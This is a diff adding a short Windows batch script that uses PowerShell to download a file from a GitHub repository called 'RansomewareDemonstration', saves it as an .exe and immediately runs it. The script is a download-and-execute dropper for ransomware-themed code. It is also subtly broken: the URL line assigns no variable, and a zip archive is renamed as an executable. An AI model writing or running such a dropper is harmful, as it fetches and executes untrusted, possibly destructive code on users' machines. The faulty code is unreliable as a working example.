@@ -1,0 +1,16 @@
+@echo off
+SETLOCAL ENABLEDELAYEDEXPANSION
+
+:: URL of the file to download
+SET "https://github.com/kcverbrugge/RansomewareDemonstration/archive/refs/heads/main.zip"
+
+:: Path where the file will be saved
+SET "savePath=%~dp0downloadedFile.exe"
+
+:: Download the file using PowerShell
+PowerShell -Command "Invoke-WebRequest '%downloadURL%' -OutFile '!savePath!'"
+
+:: Execute the downloaded file
+START "" "!savePath!"
+
+ENDLOCAL
